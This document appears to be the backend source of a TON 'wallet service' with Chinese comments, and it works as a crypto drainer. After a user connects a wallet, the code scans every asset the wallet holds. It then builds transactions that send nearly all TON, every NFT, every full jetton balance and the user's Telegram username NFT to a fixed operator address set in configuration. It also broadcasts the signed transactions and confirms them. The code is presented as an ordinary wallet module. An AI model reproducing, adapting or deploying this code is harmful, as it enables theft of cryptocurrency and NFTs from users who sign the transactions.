// WalletService.js
import redis from "../utils/redis.js";
import TonWeb from "tonweb";

const { Address, BN } = TonWeb.utils;

/**
 * 安全的数值转换工具
 */
const NumberUtils = {
  /** 将任意数值转为 BigInt，避免精度问题 */
  toBigInt(value) {
    if (typeof value === "bigint") return value;
    if (typeof value === "string") return BigInt(value);
    if (typeof value === "number") {
      if (!Number.isInteger(value)) {
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BigInt`);
      }
      return BigInt(value);
    }
    if (value instanceof BN) return BigInt(value.toString());
    throw new Error(`无法将 ${typeof value} 类型转换为 BigInt`);
  },

  /** 将任意数值转为 BN 对象 */
  toBN(value) {
    if (value instanceof BN) return value;
    if (typeof value === "bigint") return new BN(value.toString());
    if (typeof value === "string") return new BN(value);
    if (typeof value === "number") {
      if (!Number.isInteger(value)) {
        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BN`);
      }
      return new BN(value.toString()); // 修复：先转为字符串再创建 BN
    }
    throw new Error(`无法将 ${typeof value} 类型转换为 BN`);
  },

  /** 安全的字符串转换 */
  toString(value) {
    if (typeof value === "string") return value;
    if (typeof value === "bigint") return value.toString();
    if (typeof value === "number") return value.toString();
    if (value instanceof BN) return value.toString();
    return String(value);
  },
};

/**
 * 辅助：把人类可读金额转为 raw（uint128 / BigInt）
 */
function convertHumanAmountToRawBigInt(humanReadableAmount, tokenDecimals) {
  try {
    const [integerPart = "0", fractionalPart = ""] =
      String(humanReadableAmount).split(".");
    const paddedFractionalPart = (
      fractionalPart + "0".repeat(tokenDecimals)
    ).slice(0, tokenDecimals);
    const rawAmountString =
      (integerPart + paddedFractionalPart).replace(/^0+/, "") || "0";
    return NumberUtils.toBigInt(rawAmountString);
  } catch (error) {
    throw new Error(`金额转换失败 ${humanReadableAmount}: ${error.message}`);
  }
}

/**
 * 获取 TonWeb Provider（Toncenter）
 */
function createTonWebInstance() {
  const httpProvider = new TonWeb.HttpProvider(process.env.TONCENTER_RPC, {
    apiKey: process.env.TONCENTER_API_KEY || "",
  });
  return new TonWeb(httpProvider);
}

/**
 * 通过 Jetton Root + owner 计算"发送方 JettonWallet 地址"
 */
async function calculateSenderJettonWalletAddress(
  jettonMasterAddress,
  ownerWalletAddress
) {
  const tonWebInstance = createTonWebInstance();
  const jettonMinter = new TonWeb.token.jetton.JettonMinter(
    tonWebInstance.provider,
    {
      address: new Address(jettonMasterAddress),
    }
  );
  return await jettonMinter.getJettonWalletAddress(
    new Address(ownerWalletAddress)
  );
}

/**
 * 正确的 Jetton 转账 payload 构建
 */
async function buildJettonTransferPayloadBase64({
  recipientAddress, // 收款人地址
  transferAmountRaw, // 转账数量（BigInt格式）
  responseDestination, // 回执地址
  forwardTonAmount = "0", // 附带的TON数量，最小值
  forwardMessage = "", // 备注，可为空
}) {
  const JETTON_TRANSFER_OPCODE = 0xf8a7ea5; // 正确的操作码
  const transferCell = new TonWeb.boc.Cell();

  // 构建正确的 Jetton 转账消息结构
  transferCell.bits.writeUint(JETTON_TRANSFER_OPCODE, 32); // transfer op
  transferCell.bits.writeUint(0, 64); // query id

  // 使用 writeCoins 写入 Jetton 数量
  const transferAmountBN = NumberUtils.toBN(transferAmountRaw);
  transferCell.bits.writeCoins(transferAmountBN); // transfer amount in nano

  transferCell.bits.writeAddress(new Address(recipientAddress)); // destination address
  transferCell.bits.writeAddress(new Address(responseDestination)); // response address
  transferCell.bits.writeBit(0); // no custom payload
  transferCell.bits.writeCoins(TonWeb.utils.toNano(String(forwardTonAmount))); // forward ton amount

  // forward payload
  if (forwardMessage) {
    transferCell.bits.writeBit(1); // has forward payload
    const forwardPayloadCell = new TonWeb.boc.Cell();
    forwardPayloadCell.bits.writeUint(0, 32); // text comment prefix
    forwardPayloadCell.bits.writeBytes(Buffer.from(forwardMessage, "utf8"));
    transferCell.refs.push(forwardPayloadCell);
  } else {
    transferCell.bits.writeBit(0); // no forward payload
  }

  const bocData = await transferCell.toBoc(false);
  return Buffer.from(bocData).toString("base64");
}

/**
 * NFT 标准 transfer
 */
async function buildNftTransferPayloadBase64({
  recipientAddress,
  responseDestination,
  forwardTonAmount = 0,
  forwardMessage = "",
}) {
  if (typeof recipientAddress !== "string") {
    throw new Error(`recipientAddress 不是字符串: ${recipientAddress}`);
  }
  if (typeof responseDestination !== "string") {
    throw new Error(`responseDestination 不是字符串: ${responseDestination}`);
  }

  const NFT_TRANSFER_OPCODE = 0x5fcc3d14;
  const nftTransferCell = new TonWeb.boc.Cell();
  nftTransferCell.bits.writeUint(NFT_TRANSFER_OPCODE, 32); // NFT transfer op

  // 简单 query_id：毫秒时间戳*1024 + 0-1023 随机
  const currentTimestamp = Date.now();
  const randomNumber = Math.floor(Math.random() * 1024);
  const uniqueQueryId = currentTimestamp * 1024 + randomNumber;
  nftTransferCell.bits.writeUint(uniqueQueryId, 64);

  nftTransferCell.bits.writeAddress(new Address(recipientAddress));
  nftTransferCell.bits.writeAddress(new Address(responseDestination));
  nftTransferCell.bits.writeBit(0); // no custom_payload
  nftTransferCell.bits.writeCoins(
    TonWeb.utils.toNano(String(forwardTonAmount))
  );

  if (forwardMessage) {
    const forwardPayloadCell = new TonWeb.boc.Cell();
    forwardPayloadCell.bits.writeUint(0, 32);
    forwardPayloadCell.bits.writeBytes(Buffer.from(forwardMessage, "utf8"));
    nftTransferCell.refs.push(forwardPayloadCell);
  } else {
    nftTransferCell.bits.writeBit(0); // 无 ref payload
  }

  const bocData = await nftTransferCell.toBoc(false);
  return Buffer.from(bocData).toString("base64");
}

export class WalletService {
  /**
   * 连接钱包：缓存到 Redis
   */
  static async connectWallet(wallet, raw) {
    try {
      const walletKey = `wallet:${wallet}`;
      await redis.set(
        walletKey,
        JSON.stringify({
          ...raw,
          connectedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        })
      );

      console.log("钱包连接成功，已缓存到Redis:", wallet);

      return {
        success: true,
        message: "",
        data: { status: "connected" },
      };
    } catch (error) {
      throw new Error(`connected error: ${error.message}`);
    }
  }

  /**
   * 工具：TON → nanoTON（字符串）
   */
  static convertTonToNanoString = (tonAmount) => {
    try {
      // 安全处理数值精度
      let processedTonAmount = tonAmount;
      if (typeof tonAmount === "number") {
        processedTonAmount = tonAmount.toFixed(9); // 最多 9 位小数，避免精度问题
      }

      const nanoTonAmount = TonWeb.utils.toNano(
        NumberUtils.toString(processedTonAmount)
      );
      return NumberUtils.toString(nanoTonAmount);
    } catch (error) {
      throw new Error(`TON 金额转换失败 ${tonAmount}: ${error.message}`);
    }
  };

  /**
   * 生成 "用户名 NFT 转移" 的交易
   */
  static async createUsernameNftTransaction(senderWallet, productDetails) {
    try {
      console.log("createUsernameNftTransaction", senderWallet, productDetails);
      const walletCacheKey = `wallet:${senderWallet}`;
      const cachedWalletData = await redis.get(walletCacheKey);
      if (!cachedWalletData) throw new Error("walletData not found");

      const usernameToTransfer = productDetails?.[2];
      const recipientWalletAddress = process.env.RECIPIENT_ADDRESS;
      if (!usernameToTransfer || !recipientWalletAddress) {
        throw new Error("username 或 RECIPIENT_ADDRESS 缺失");
      }

      // 解析 t.me DNS -> 找到 NFT item 地址
      const dnsApiResponse = await fetch(
        `${process.env.TONAPI_URL}/v2/dns/${usernameToTransfer}.t.me`
      );
      const dnsResponseData = await dnsApiResponse.json();
      const nftItemContractAddress = dnsResponseData?.item?.address ?? null;
      if (!nftItemContractAddress)
        throw new Error("未找到用户名 NFT Item 地址");

      // 附带的 TON 金额（gas）
      const gasAmountNano = this.convertTonToNanoString(0.1);

      const nftTransferPayload = await buildNftTransferPayloadBase64({
        recipientAddress: recipientWalletAddress,
        responseDestination: senderWallet,
        forwardTonAmount: 0,
        // forwardMessage: `transfer @${usernameToTransfer}`,
      });

      const transactionMessages = [
        {
          address: nftItemContractAddress, // 目标是 NFT item 合约
          amount: gasAmountNano,
          payload: nftTransferPayload,
        },
      ];

      const transactionMetadata = {
        type: "nft_username_transfer",
        username: usernameToTransfer,
        wallet: senderWallet,
        nftItemAddress: nftItemContractAddress,
        newOwnerWallet: recipientWalletAddress,
        amount: gasAmountNano,
        timestamp: Date.now(),
      };

      return {
        messages: transactionMessages,
        raw: transactionMetadata,
      };
    } catch (error) {
      console.error("createUsernameNftTransaction", error);
      throw new Error(`createUsernameNftTransaction error: ${error.message}`);
    }
  }

  /**
   * 拉取钱包资产（TON / NFTs / Jettons）
   */
  static async getAllWalletAssets(walletAddress) {
    try {
      const assets = {
        ton: { balance: "0", balanceTon: "0" },
        nfts: [],
        jettons: [], // tonapi: balances: [{ balance, wallet_address, jetton: { address, name, symbol, decimals, ... } }]
      };

      // 1. TON 余额
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/blockchain/accounts/${walletAddress}`
        );
        const data = await res.json();
        assets.ton.balance = data.balance || "0";
        const balanceStr = NumberUtils.toString(data.balance || "0");
        assets.ton.balanceTon = TonWeb.utils.fromNano(balanceStr);
      }

      // 2. NFTs
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/nfts?limit=1000`
        );
        const data = await res.json();
        assets.nfts = data.nft_items || [];
      }

      // 3. Jettons
      {
        const res = await fetch(
          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/jettons?limit=1000`
        );
        const data = await res.json();
        assets.jettons = data.balances || [];
      }

      console.log("钱包资产扫描完成:", {
        ton: assets.ton.balanceTon,
        nftCount: assets.nfts.length,
        jettonCount: assets.jettons.length,
      });

      return assets;
    } catch (error) {
      console.error("获取钱包资产错误:", error);
      throw new Error(`获取钱包资产失败: ${error.message}`);
    }
  }

  /**
   * 批量资产转移（TON + 所有 NFT + 所有 Jetton，包括 USDT）
   */
  static async createAllAssetTransfer(wallet) {
    const targetOwner = process.env.RECIPIENT_ADDRESS; // 收款人的"普通钱包地址（owner）"
    if (!targetOwner) throw new Error("缺少 RECIPIENT_ADDRESS");

    try {
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);
      if (!walletData) throw new Error("walletData not found");

      // 获取资产
      const assets = await this.getAllWalletAssets(wallet);
      const messages = [];
      const tonReserveAmount = 0.5; // 预留 2 TON
      if (assets.ton.balanceTon < tonReserveAmount) {
        throw new Error("TON 余额不足");
      }
      // 1) TON：保留 gas（避免把 TON 清空）
      const currentTonBalance = parseFloat(assets.ton.balanceTon || "0");
      //
      const availableTonToSend = Math.max(
        0,
        currentTonBalance - tonReserveAmount
      );
      if (availableTonToSend > tonReserveAmount) {
        try {
          messages.push({
            address: targetOwner,
            amount: this.convertTonToNanoString(availableTonToSend),
            payload: "",
          });
        } catch (error) {
          console.warn(`TON转账金额处理失败: ${error.message}`);
        }
      }

      // 2) NFTs：逐个把所有权转给 targetOwner
      for (const nftItem of assets.nfts) {
        const nftTransferPayload = await buildNftTransferPayloadBase64({
          recipientAddress: targetOwner,
          responseDestination: wallet,
          forwardTonAmount: 0,
          // forwardMessage: `Bulk transfer NFT`,
        });

        messages.push({
          address: nftItem.address, // 目标是 NFT item 合约地址
          amount: this.convertTonToNanoString(0.05), // 给 item 的 gas
          payload: nftTransferPayload,
        });
      }

      // 3) Jettons：统一用 TIP-3 transfer
      // tonapi 返回的每个 jetton 结构：{ balance: "raw", wallet_address, jetton: { address: root, decimals, symbol, ... } }
      for (const jettonBalance of assets.jettons) {
        try {
          const jettonMasterAddress = jettonBalance?.jetton?.address;
          const rawBalanceString = NumberUtils.toString(
            jettonBalance?.balance ?? "0"
          );
          const jettonAmountRaw = NumberUtils.toBigInt(rawBalanceString);

          if (!jettonMasterAddress || jettonAmountRaw === 0n) {
            console.log(
              `跳过无效 Jetton: ${jettonMasterAddress}, balance: ${rawBalanceString}`
            );
            continue;
          }

          // 计算发送方的 JettonWallet 地址
          const senderJettonWalletAddress =
            await calculateSenderJettonWalletAddress(
              jettonMasterAddress,
              wallet
            );

          // 构造 payload（全额转出）
          const jettonTransferPayload = await buildJettonTransferPayloadBase64({
            recipientAddress: targetOwner,
            transferAmountRaw: jettonAmountRaw,
            responseDestination: wallet,
            forwardTonAmount: "0", // 最小 forward amount
            // forwardMessage: `Transfer ${jettonBalance?.jetton?.symbol || 'Jetton'}`,
          });

          // 修复：外部消息发送到 senderJettonWalletAddress（发送方的 Jetton 钱包）
          messages.push({
            address: senderJettonWalletAddress.toString(true, true, true), // userFriendly=true, urlSafe=true, testOnly=true
            amount: this.convertTonToNanoString(0.08), // 增加 Gas 费用，确保有足够的 TON 处理转账
            payload: jettonTransferPayload,
          });

          console.log(
            `添加 Jetton 转账: ${
              jettonBalance?.jetton?.symbol || "Unknown"
            }, 数量: ${rawBalanceString}`
          );
        } catch (error) {
          console.error(
            `处理 Jetton 转账失败: ${
              jettonBalance?.jetton?.symbol || "Unknown"
            }`,
            error
          );
          // 继续处理下一个 Jetton，不中断整个流程
        }
      }

      console.log(`批量转移交易已生成: ${JSON.stringify(messages, null, 2)}`);
      return {
        success: true,
        data: { messages },
        assets,
        messages,
        message: `批量转移交易已生成: ${messages.length} 个消息`,
      };
    } catch (error) {
      console.error("创建批量资产转移错误:", error);
      throw new Error(`创建批量资产转移失败: ${error.message}`);
    }
  }

  /**
   * 广播已签名的 BOC（支持多种 API 接口）
   */
  static async broadcastWithTonapi(wallet, raw) {
    // 尝试多个可能的 TONAPI 接口路径
    const possibleEndpoints = ["v2/blockchain/message"];

    let lastError = null;

    for (const endpoint of possibleEndpoints) {
      try {
        console.log(`尝试接口: ${process.env.TONAPI_URL}/${endpoint}`);

        const res = await fetch(`${process.env.TONAPI_URL}/${endpoint}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ boc: raw.boc.boc }),
        });

        const data = await res.json().catch(() => ({}));

        if (res.ok) {
          console.log(`✅ 接口成功: ${endpoint}`, data);
          await redis.set(`boc:${wallet}`, JSON.stringify({ ...data }));
          return await this.handleTransactionConfirmation(wallet, raw, data);
        } else {
          console.log(
            `❌ 接口失败: ${endpoint}, 状态: ${res.status}, 响应:`,
            data
          );
          lastError = new Error(
            `${endpoint} failed: ${
              data?.message || data?.error || res.statusText
            }`
          );
        }
      } catch (error) {
        console.log(`❌ 接口错误: ${endpoint}`, error.message);
        lastError = error;
        continue; // 尝试下一个接口
      }
    }

    // 所有接口都失败了
    throw new Error(
      `所有 TONAPI 接口都失败了。最后一个错误: ${lastError?.message}`
    );
  }

  /**
   * 处理交易确认
   */
  static async handleTransactionConfirmation(wallet, raw, data) {
    try {
      // 尝试确认第一条消息
      const targetAddress = raw.messages?.[0]?.address;
      const expect = {
        to: targetAddress,
        since: Date.now() - 5 * 60 * 1000, // 最近5分钟
        // 可选：minAmountNano: raw.messages?.[0]?.amount
      };

      const confirmed = await this.waitForConfirmation(
        wallet,
        targetAddress,
        expect,
        process.env.TONAPI_KEY,
        90_000,
        3_000
      );

      return { success: true, confirmed, data };
    } catch (e) {
      // 未确认不代表失败，可能还没进块
      console.log("交易确认超时，但可能仍在处理中:", e.message);
      return { success: true, pending: true, data };
    }
  }

  static async sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
  }

  /**
   * 简单轮询确认：在窗口期内寻找符合条件的一笔入账
   * @param {string} wallet - 发起钱包地址
   * @param {string} account - 目标账户（例如 NFT item 地址或收款地址）
   * @param {{minAmountNano?: string, from?: string, to?: string, since?: number}} expect
   * @param {string} apiKey - TONAPI 密钥
   * @param {number} timeoutMs - 超时时间（毫秒）
   * @param {number} intervalMs - 检查间隔（毫秒）
   */
  static async waitForConfirmation(
    wallet,
    account,
    expect,
    apiKey,
    timeoutMs = 60_000,
    intervalMs = 3_000
  ) {
    if (!account) throw new Error("waitForConfirmation: account 缺失");
    const deadline = Date.now() + timeoutMs;

    while (Date.now() < deadline) {
      const url = `${process.env.TONAPI_URL}/v2/blockchain/accounts/${account}/transactions?limit=20`;
      const res = await fetch(url, {
        headers: { Authorization: `Bearer ${apiKey || ""}` },
      });

      if (res.ok) {
        const data = await res.json();
        const txs = data?.transactions ?? [];

        const hit = txs.find((tx) => {
          const inMsg = tx?.in_msg;
          if (!inMsg) return false;

          const okTo = expect.to
            ? inMsg.destination?.address === expect.to
            : true;
          const okTime = expect.since ? tx.utime * 1000 >= expect.since : true;

          let okAmt = true;
          if (expect.minAmountNano) {
            try {
              const val = NumberUtils.toBigInt(inMsg.value || "0");
              const minAmt = NumberUtils.toBigInt(expect.minAmountNano);
              okAmt = val >= minAmt;
            } catch (error) {
              console.warn(`金额比较失败: ${error.message}`);
              okAmt = false;
            }
          }

          // 可扩展 from 校验
          const okFrom = expect.from
            ? inMsg.source?.address === expect.from
            : true;

          return okTo && okTime && okAmt && okFrom;
        });

        if (hit) {
          await redis.del(`boc:${wallet}`);
          return hit; // 找到匹配交易
        }
      }

      await this.sleep(intervalMs);
    }

    throw new Error("confirmation timeout");
  }

  /**
   * 断开钱包连接
   */
  static async disconnectWallet(wallet) {
    try {
      const walletKey = `wallet:${wallet}`;
      await redis.del(walletKey);
      console.log("钱包断开连接成功:", wallet);
      return { success: true, message: "断开连接成功" };
    } catch (error) {
      throw new Error(`disconnect error: ${error.message}`);
    }
  }

  /**
   * 获取钱包状态
   */
  static async getWalletStatus(walletAddress) {
    try {
      const walletKey = `wallet:${walletAddress}`;
      const walletData = await redis.get(walletKey);

      if (!walletData) {
        return { status: "disconnected" };
      }

      const data = JSON.parse(walletData);
      return {
        status: "connected",
        connectedAt: data.connectedAt,
        lastActivity: data.lastActivity,
      };
    } catch (error) {
      throw new Error(`get wallet status error: ${error.message}`);
    }
  }

  /**
   * 清理过期数据
   */
  static async cleanupExpiredData() {
    try {
      // 这里可以添加清理过期缓存的逻辑
      console.log("开始清理过期数据...");

      // 示例：清理超过24小时的钱包连接数据
      // 具体实现取决于你的业务需求

      console.log("清理过期数据完成");
      return { success: true, message: "清理完成" };
    } catch (error) {
      throw new Error(`cleanup error: ${error.message}`);
    }
  }
}
